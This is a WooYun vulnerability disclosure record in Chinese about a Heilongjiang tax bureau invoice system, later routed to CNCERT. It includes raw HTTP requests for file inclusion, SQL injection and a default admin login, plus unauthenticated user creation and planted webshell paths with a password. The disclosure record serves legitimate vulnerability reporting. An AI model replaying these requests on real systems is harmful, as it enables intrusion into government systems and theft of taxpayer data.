{"id": 80560, "wybug_id": "wooyun-2015-0155648", "wybug_title": "黑龙江省国税局某系统漏洞打包（文件包含，sql注入多处，未授权访问，getshell等）", "wybug_corp": "黑龙江省国税局", "wybug_author": "路人甲", "wybug_date": "2015-11-25 14:58", "wybug_open_date": "2016-01-11 15:32", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-11-25：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-11-27：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-12-07：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-12-17：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-12-27：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-01-11：\t细节向公众公开  简要描述： 漏洞打包（文件包含，sql注入多处，未授权访问，getshell，20000+企业信息等）看我打包这么多，给个首页吧，守榜不容易啊~本来藏着是打算找个通用的 详细说明：  http://**.**.**.**:8700/黑龙江省国税局增值税专用发票抵扣联信息认证系统\n\n1#文件包含\nPOST http://**.**.**.**:8700/changePass HTTP/1.1Accept: text/html, application/xhtml+xml, */*Referer: http://**.**.**.**:8700/ChangePassword1.jspAccept-Language: zh-CNUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)Content-Type: application/x-www-form-urlencodedAccept-Encoding: gzip, deflateHost: **.**.**.**:8700Content-Length: 121Connection: Keep-AlivePragma: no-cacheCookie: JSESSIONID=WS2f7PNPyJhmnwS2qvf2FVTnnMJ1wxTGfFgL8KMy721kyKxJhb9f!-2087357998Username=null&oldpassword=123&newpassword=123&PwdConfirm=123&Submit=+%C8%B7+%EF%BF%BD%EF%BF%BD+&page=%2FWEB-INF%2Fweb.xml\n注意参数page\n\n2#sql注入（目测登录口那个已经被发现了，我这个是忘记密码的，不是同一处）\nPOST http://**.**.**.**:8700/changePass HTTP/1.1Accept: text/html, application/xhtml+xml, */*Referer: http://**.**.**.**:8700/ChangePassword1.jspAccept-Language: zh-CNUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)Content-Type: application/x-www-form-urlencodedAccept-Encoding: gzip, deflateHost: **.**.**.**:8700Content-Length: 111Connection: Keep-AlivePragma: no-cacheCookie: JSESSIONID=WS2f7PNPyJhmnwS2qvf2FVTnnMJ1wxTGfFgL8KMy721kyKxJhb9f!-2087357998Username=admin&oldpassword=123&newpassword=123&PwdConfirm=123&Submit=+%C8%B7+%B6%A8+&page=%2FChangePassword1.jsp\n\n\n\n\n支持--os-shell\n\n可写shell\n\n   漏洞证明：  登录口那处我也补一个呗，万一不是这个系统呢\nPOST http://**.**.**.**:8700/CheckLoginServlet HTTP/1.1Accept: text/html, application/xhtml+xml, */*Referer: http://**.**.**.**:8700/Accept-Language: zh-CNUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)Content-Type: application/x-www-form-urlencodedAccept-Encoding: gzip, deflateHost: **.**.**.**:8700Content-Length: 37Connection: Keep-AlivePragma: no-cacheCookie: JSESSIONID=WJh12qsKpm8xlXTSQm1rGwFNwnlz55hF9pSxggwPrQvzP6J190tm!-2087357998UserName=admin&Password=admin&x=0&y=0\n3#未授权访问（这个比较有意思）http://**.**.**.**:8700/Add_User.jsp\n\n点击检索用户\n\n这个请求包是直接发sql语句，比较奇葩\n\n虽然知道了用户密码，但解密不了，所以我们新增权限一定要多\n\n\n\n你懂的进系统了\n\n20000+企业信息\n\n其实进了系统你才会知道，这系统到处都是注入，到处都是包含，你要做的就是尝试\nPOST http://**.**.**.**:8700/UserInfoServlet?action_type=query HTTP/1.1Accept: text/html, application/xhtml+xml, */*Referer: http://**.**.**.**:8700/query.jspAccept-Language: zh-CNUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)Content-Type: application/x-www-form-urlencodedAccept-Encoding: gzip, deflateHost: **.**.**.**:8700Content-Length: 91Connection: Keep-AlivePragma: no-cacheCookie: JSESSIONID=WJh12qsKpm8xlXTSQm1rGwFNwnlz55hF9pSxggwPrQvzP6J190tm!-2087357998UserID=2&UserName=1&donet_type=1&douser_type=1&repages=%2Fquery.jsp&totalsize=1&pageno=1\n\n\n\nPOST http://**.**.**.**:8700/ErrorDataListServlet?action_type=query HTTP/1.1Accept: text/html, application/xhtml+xml, */*Referer: http://**.**.**.**:8700/ErrorDataList.jspAccept-Language: zh-CNUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)Content-Type: application/x-www-form-urlencodedAccept-Encoding: gzip, deflateHost: **.**.**.**:8700Content-Length: 112Connection: Keep-AlivePragma: no-cacheCookie: JSESSIONID=WJh12qsKpm8xlXTSQm1rGwFNwnlz55hF9pSxggwPrQvzP6J190tm!-2087357998nsrList=2&nsrName=&OpeType=3&dfrom=20151101&dto=20151124&repages=%2FErrorDataList.jsp&totalsize=null&pageno=null\n\n\n\n\n太多处了不一一跑出结果了4#shell\n\n找呀找呀找路径shell：http://**.**.**.**:8700/wpp.jsphttp://**.**.**.**:8700/haoma.jsp\n\n密码：4423054\n\n\n\n   修复方案：  下线，找厂商要补丁   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：11  确认时间：2015-11-27 15:10 厂商回复： CNVD确认并复现所述漏洞情况，已经转由CNCERT下发黑龙江分中心，由其后续协调网站管理单位处置。 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 11, "Ranks": null}